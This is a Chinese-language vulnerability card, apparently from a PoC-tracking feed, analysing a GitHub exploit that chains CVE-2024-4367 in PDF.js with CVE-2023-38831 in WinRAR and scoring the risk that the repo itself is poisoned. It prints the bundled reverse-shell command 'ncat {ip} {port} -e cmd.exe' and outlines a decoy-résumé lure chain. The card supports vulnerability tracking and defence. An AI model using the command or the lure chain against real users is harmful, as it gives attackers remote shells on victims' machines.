## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**漏洞编号:** CVE-2024-4367

**漏洞类型:** PDF.js 字体处理类型检查缺失导致任意JavaScript执行 & WinRAR命令执行

**影响应用:** Firefox, Firefox ESR, Thunderbird, WinRAR

**危害等级:** 高危，允许攻击者远程执行任意命令

**影响版本:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**利用条件:** 目标系统需安装受影响版本的Firefox/Thunderbird和WinRAR，且用户需要打开恶意PDF文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该POC利用了CVE-2024-4367 (PDF.js字体处理类型检查缺失导致任意JavaScript执行) 和 CVE-2023-38831 (WinRAR命令执行) 两个漏洞。

**漏洞利用方式:**
1.  **CVE-2024-4367:**  通过构造恶意的PDF文件，绕过PDF.js的类型检查，在PDF.js上下文中执行任意JavaScript代码。
2.  **CVE-2023-38831:**  利用WinRAR处理压缩包时的命令执行漏洞。恶意rar文件中包含pdf和bat脚本,当用户尝试打开这个PDF文档时，会触发WinRAR漏洞，执行捆绑的BAT脚本。
3.  **POC代码流程:**
    *   主脚本`PDFernetRemotelo.py`提示用户输入攻击者IP和端口。
    *   创建诱饵PDF文件（`ResumendeSueldo.pdf`）和一个包含反向shell命令的BAT脚本（`script.bat`），脚本内容为`ncat {ip} {port} -e cmd.exe`。
    *   使用`PDFernet.py`脚本生成包含恶意JavaScript的`poc.pdf`文件，该JavaScript代码由用户提供的payload生成，此payload会被嵌入到PDF的字体信息中.
    *   `Remotelo.py`脚本创建一个RAR压缩包（`PDFernetRemotelo.rar`），其中包含诱饵PDF文件和BAT脚本。
    *   用户打开`PDFernetRemotelo.rar`中的`ResumendeSueldo.pdf`，触发CVE-2024-4367，执行嵌入的恶意JavaScript代码。
    *   恶意JavaScript代码可能触发CVE-2023-38831，执行RAR压缩包中的`script.bat`，建立与攻击者机器的反向shell。

**有效性评估:**
根据漏洞信息和搜索结果，该POC在受影响的版本中是有效的。GitHub上已经有该漏洞的武器化利用。

**投毒风险评估:**
该POC代码的主要功能是生成包含恶意代码的PDF和RAR文件，其核心功能是利用已知的漏洞。`PDFernetRemotelo.py` 使用了外部脚本 `PDFernet.py`和 `Remotelo.py`，审查这些脚本，发现`PDFernet.py`中的payload生成逻辑是可控的，直接来自于用户提供的参数。`Remotelo.py`脚本创建RAR压缩包的过程比较标准。投毒风险在于：
1.  **依赖外部脚本:** `PDFernetRemotelo.py` 调用了`PDFernet.py` 和 `Remotelo.py` 脚本,存在恶意修改此脚本的可能性.
2.   **Payload嵌入方式:** 恶意代码嵌入在PDF字体信息中，如果对PDF格式不熟悉，很难直接看出是否存在恶意代码。审查时需谨慎。
3.   **隐蔽性:** 利用RAR压缩包将PDF和BAT脚本捆绑在一起，增加了攻击的隐蔽性。

代码中可能存在的投毒点在于：
1.  在`PDFernet.py`中，攻击者可能会添加额外的JavaScript代码，执行恶意操作，例如下载恶意文件或窃取用户数据。
2.  在生成的RAR压缩包中，可能会添加额外的文件，例如恶意DLL文件或后门程序。

基于以上分析，虽然核心代码看起来比较直接，但考虑到依赖外部脚本以及payload嵌入方式的隐蔽性，仍然存在一定的投毒风险。保守估计投毒风险为10%。

**项目地址:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**漏洞详情:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)